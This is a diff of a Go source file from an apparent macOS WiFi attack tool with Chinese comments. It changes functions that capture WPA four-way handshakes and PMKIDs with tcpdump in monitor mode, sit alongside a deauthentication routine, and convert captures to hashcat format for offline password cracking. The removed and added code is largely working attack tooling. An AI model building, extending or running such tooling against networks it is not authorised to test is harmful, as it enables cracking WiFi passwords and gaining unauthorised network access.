@@ -126,8 +126,8 @@ func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) Captur
 
 	// ── 步骤1: 断开当前WiFi连接（disassociate，让接口可进入监控模式） ──
 	logf("[1/5] 断开当前WiFi连接...")
-	// 用networksetup disassociate，不关电（关电会导致tcpdump无法使用接口）
-	runCmd("sudo", "networksetup", "-setairportnetwork", cfg.Interface, "")
+	// 方法1: wdutil disconnect（macOS 26.3推荐）
+	runCmd("sudo", "wdutil", "disconnect")
 	time.Sleep(1 * time.Second)
 
 	// ── 步骤2: 启动tcpdump全量捕获（beacon + EAPOL一起抓） ──
@@ -193,63 +193,14 @@ func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) Captur
 }
 
 // ============================================================
-// captureBeacon 捕获目标AP的beacon帧
-// 使用tcpdump -I（监控模式）捕获802.11管理帧
+// RestoreWiFiInterface 恢复WiFi接口到正常模式
+// tcpdump -I会把接口设为监控模式，需要关开电来恢复
 // ============================================================
-func captureBeacon(ssid, bssid string, cfg CaptureConfig) bool {
-	safeName := strings.ReplaceAll(bssid, ":", "")
-	outFile := filepath.Join(cfg.OutputDir, safeName+"_beacon.cap")
-
-	// 使用tcpdump的-I标志进入监控模式捕获beacon
-	// 过滤条件：管理帧中的beacon子类型，且源MAC为目标BSSID
-	filter := fmt.Sprintf("type mgt subtype beacon and ether src %s", bssid)
-
-	ctx, cancel := context.WithTimeout(context.Background(), cfg.BeaconTimeout)
-	defer cancel()
-
-	cmd := exec.CommandContext(ctx, "sudo", "tcpdump",
-		filter,
-		"-I",             // 监控模式
-		"-c", "1",        // 只捕获1个包
-		"-i", cfg.Interface,
-		"-w", outFile,
-	)
-	cmd.Stderr = os.Stderr
-
-	err := cmd.Run()
-	if err != nil && ctx.Err() != context.DeadlineExceeded {
-		return false
-	}
-
-	// 检查文件是否存在且有内容
-	info, err := os.Stat(outFile)
-	return err == nil && info.Size() > 24 // pcap文件头至少24字节
-}
-
-// ============================================================
-// startHandshakeCapture 启动EAPOL握手包捕获（后台运行）
-// ============================================================
-func startHandshakeCapture(ctx context.Context, bssid string, cfg CaptureConfig) *exec.Cmd {
-	safeName := strings.ReplaceAll(bssid, ":", "")
-	outFile := filepath.Join(cfg.OutputDir, safeName+"_handshake.cap")
-
-	// 捕获EAPOL帧（802.1X认证帧，包含四次握手和PMKID）
-	filter := fmt.Sprintf("ether proto 0x888e and ether host %s", bssid)
-
-	cmd := exec.CommandContext(ctx, "sudo", "tcpdump",
-		filter,
-		"-I",                // 监控模式
-		"-U",                // 无缓冲写入
-		"-i", cfg.Interface,
-		"-w", outFile,
-	)
-	cmd.Stderr = os.Stderr
-
-	if err := cmd.Start(); err != nil {
-		return nil
-	}
-
-	return cmd
+func RestoreWiFiInterface(iface string) {
+	runCmd("networksetup", "-setairportpower", iface, "off")
+	time.Sleep(500 * time.Millisecond)
+	runCmd("networksetup", "-setairportpower", iface, "on")
+	time.Sleep(1 * time.Second)
 }
 
 // ============================================================
@@ -305,39 +256,6 @@ func sendDeauth(bssid string, cfg CaptureConfig) {
 			time.Sleep(cfg.DeauthDelay)
 		}
 	}
-}
-
-// ============================================================
-// mergeCaptures 合并beacon和握手包文件
-// ============================================================
-func mergeCaptures(cfg CaptureConfig, result CaptureResult) bool {
-	// 检查哪些文件存在
-	var files []string
-	if fileExists(result.BeaconFile) {
-		files = append(files, result.BeaconFile)
-	}
-	if fileExists(result.HandFile) {
-		files = append(files, result.HandFile)
-	}
-
-	if len(files) == 0 {
-		return false
-	}
-
-	// 只有一个文件时直接复制
-	if len(files) == 1 {
-		data, err := os.ReadFile(files[0])
-		if err != nil {
-			return false
-		}
-		return os.WriteFile(result.MergedFile, data, 0644) == nil
-	}
-
-	// 使用mergecap合并
-	args := []string{"-a", "-F", "pcap", "-w", result.MergedFile}
-	args = append(args, files...)
-	cmd := exec.Command("mergecap", args...)
-	return cmd.Run() == nil
 }
 
 // ============================================================
@@ -400,49 +318,11 @@ func convertToHashcat(result CaptureResult) (bool, bool, bool) {
 }
 
 // ============================================================
-// QuickPMKIDScan 快速PMKID扫描（不需要deauth，被动捕获）
-// 对多个目标同时监听，尝试获取PMKID
+// CheckSudo 检查是否有sudo权限（捕获和deauth都需要）
 // ============================================================
-func QuickPMKIDScan(iface, outputDir string, duration time.Duration, verbose bool) string {
-	if err := os.MkdirAll(outputDir, 0755); err != nil {
-		return ""
-	}
-
-	outFile := filepath.Join(outputDir, "pmkid_scan.cap")
-	hashFile := filepath.Join(outputDir, "pmkid_scan.22000")
-
-	if verbose {
-		fmt.Printf("    [*] PMKID被动扫描（%s）...\n", duration)
-	}
-
-	// 使用tcpdump捕获所有EAPOL帧
-	ctx, cancel := context.WithTimeout(context.Background(), duration)
-	defer cancel()
-
-	cmd := exec.CommandContext(ctx, "sudo", "tcpdump",
-		"ether proto 0x888e",
-		"-I",
-		"-U",
-		"-i", iface,
-		"-w", outFile,
-	)
-	cmd.Run()
-
-	// 转换为hashcat格式
-	if !fileExists(outFile) {
-		return ""
-	}
-
-	convCmd := exec.Command("hcxpcapngtool", "-o", hashFile, outFile)
-	convCmd.Run()
-
-	if fileExists(hashFile) {
-		info, _ := os.Stat(hashFile)
-		if info.Size() > 0 {
-			return hashFile
-		}
-	}
-	return ""
+func CheckSudo() bool {
+	cmd := exec.Command("sudo", "-n", "true")
+	return cmd.Run() == nil
 }
 
 // ============================================================
